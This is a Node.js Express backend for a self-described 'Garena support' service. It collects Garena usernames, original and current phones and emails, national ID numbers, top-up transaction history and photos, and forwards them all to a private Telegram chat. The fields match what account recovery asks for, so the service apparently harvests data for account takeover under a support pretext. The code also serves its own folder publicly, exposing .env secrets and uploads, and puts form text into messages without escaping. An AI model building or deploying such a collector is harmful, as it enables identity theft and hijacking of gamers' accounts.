/**
 * Backend Server cho Ứng dụng Hỗ trợ Garena
 * @author Dev TanPhat (Professional Coder)
 * @date 2025-11-05
 * * Chức năng:
 * 1. Xác thực Key truy cập (POST /verify-key)
 * 2. Tiếp nhận Form hỗ trợ, upload file (POST /submit-form)
 * 3. Gửi thông báo đầy đủ qua Telegram (text & photo)
 */

// --- Import Dependencies ---
const express = require('express');
const path = require('path');
const multer = require('multer');
const fs = require('fs');
const axios = require('axios');
const FormData = require('form-data');
require('dotenv').config(); // [QUAN TRỌNG] Nạp các biến từ file .env

// --- Application Constants ---
const app = express();
const PORT = 3000;
const UPLOAD_DIR = 'uploads';

// --- Security & Bot Configuration ---
// (Đọc từ file .env, không còn hard-code)
const REAL_SECRET_KEY = process.env.REAL_SECRET_KEY;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// --- Storage Engine (Multer) ---
if (!fs.existsSync(UPLOAD_DIR)){
    fs.mkdirSync(UPLOAD_DIR);
}
const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, UPLOAD_DIR + '/'),
    filename: (req, file, cb) => {
        const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
        cb(null, uniqueSuffix + '-' + file.originalname);
    }
});
const upload = multer({ storage: storage });

// --- Middleware Configuration ---
app.use(express.static(path.join(__dirname)));
app.use(express.json()); 
app.use(express.urlencoded({ extended: true }));

// --- API Endpoints ---

/**
 * [POST] /verify-key
 * Xác thực Key truy cập của người dùng
 */
app.post('/verify-key', (req, res) => {
    const { key } = req.body;
    if (!key) {
        return res.status(400).json({ success: false, message: "Không nhận được key." });
    }
    // So sánh với Key đã nạp từ .env
    if (key === REAL_SECRET_KEY) {
        console.log(`[AUTH] Xác thực thành công!`);
        res.json({ success: true, message: "Xác thực thành công!" });
    } else {
        console.log(`[AUTH] Key không hợp lệ: ${key}`);
        res.status(401).json({ success: false, message: "Key không hợp lệ." });
    }
});

/**
 * [POST] /submit-form
 * Tiếp nhận form hỗ trợ, upload file và kích hoạt thông báo Telegram.
 */
app.post('/submit-form', upload.single('attachment'), (req, res) => {
    const textData = req.body; 
    const fileData = req.file; 

    console.log("=====================================");
    console.log("🔥 YÊU CẦU HỖ TRỢ MỚI VỪA VỀ! 🔥");
    console.log("--- Dữ liệu Form (Text): ---");
    console.log(textData);
    if (fileData) console.log(`(File đã lưu tại: ${fileData.path})`);
    console.log("=====================================");

    sendTelegramNotification(textData, fileData)
        .catch(err => {
            console.error("[TELEGRAM ERROR]", err.message);
        });

    res.json({ success: true, message: "Đã nhận được yêu cầu của bạn!" });
});

// --- Telegram Service ---

/**
 * Gửi thông báo đến Telegram, bao gồm cả hình ảnh (nếu có).
 * @param {object} textData Dữ liệu text từ form (req.body)
 * @param {object} fileData Dữ liệu file từ multer (req.file)
 */
async function sendTelegramNotification(textData, fileData) {
    
    const message = formatTelegramMessage(textData);
    const telegramApi = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

    try {
        if (fileData) {
            // --- Kịch bản 1: Gửi Ảnh + Caption ---
            const url = `${telegramApi}/sendPhoto`;
            const form = new FormData();
            
            form.append('chat_id', TELEGRAM_CHAT_ID);
            form.append('caption', message);
            form.append('parse_mode', 'HTML');
            form.append('photo', fs.createReadStream(fileData.path));

            await axios.post(url, form, {
                headers: form.getHeaders()
            });
            console.log("[TELEGRAM] Gửi ảnh và thông báo thành công!");

        } else {
            // --- Kịch bản 2: Chỉ gửi Text ---
            const url = `${telegramApi}/sendMessage`;
            await axios.post(url, {
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            });
            console.log("[TELEGRAM] Gửi thông báo (text) thành công!");
        }
    } catch (error) {
        console.error("[TELEGRAM ERROR] Không gửi được tin nhắn:");
        if (error.response && error.response.data) {
            console.error(error.response.data.description);
        } else {
            console.error(error.message);
        }
    }
}

/**
 * Định dạng nội dung tin nhắn Telegram từ dữ liệu form.
 * @param {object} data Dữ liệu text (req.body)
 * @returns {string} Tin nhắn đã định dạng HTML
 */
function formatTelegramMessage(data) {
    const f = (field) => data[field] || '';

    let msg = `<b>🔥 Yêu cầu Hỗ trợ Mới - Dev TanPhat 🔥</b>\n\n`;
    msg += `<b>Tên đăng nhập Garena:</b> <pre>${f('garena-id')}</pre>\n`;
    msg += `<b>Ngày mất TK:</b> ${f('date-lost')}\n\n`;

    msg += `<b>--- Thông tin xác thực gốc ---</b>\n`;
    msg += `<b>SĐT đầu tiên:</b> <pre>${f('first-phone')}</pre>\n`;
    msg += `<b>Email đầu tiên:</b> <pre>${f('first-email')}</pre>\n`;
    msg += `<b>SĐT hiện tại (trước khi mất):</b> <pre>${f('current-phone')}</pre>\n`;
    msg += `<b>Email hiện tại (trước khi mất):</b> <pre>${f('current-email')}</pre>\n`;
    msg += `<b>CCCD trong TK:</b> <pre>${f('account-cccd')}</pre>\n`;
    msg += `<b>Họ tên trong TK:</b> <pre>${f('account-name')}</pre>\n`;
    msg += `<b>Giao dịch nạp:</b>\n<pre>${f('transactions')}</pre>\n\n`;

    msg += `<b>--- Thông tin liên hệ (Khách) ---</b>\n`;
    msg += `<b>Họ tên:</b> ${f('contact-name')}\n`;
    msg += `<b>Email:</b> <pre>${f('contact-email')}</pre>\n`;
    msg += `<b>SĐT:</b> <pre>${f('contact-phone')}</pre>\n`;
    msg += `<b>CCCD (để cập nhật):</b> <pre>${f('contact-cccd')}</pre>\n\n`;
    
    msg += `<b>--- Chi tiết vấn đề ---</b>\n`;
    msg += `<pre>${f('description')}</pre>\n`;

    return msg;
}


// --- Server Initialization ---
app.listen(PORT, () => {
    console.log(`Máy chủ "Support Garena Dev TanPhat" đang chạy tại http://localhost:${PORT}`);
    console.log(`Thư mục lưu file upload: ${path.join(__dirname, UPLOAD_DIR)}`);
});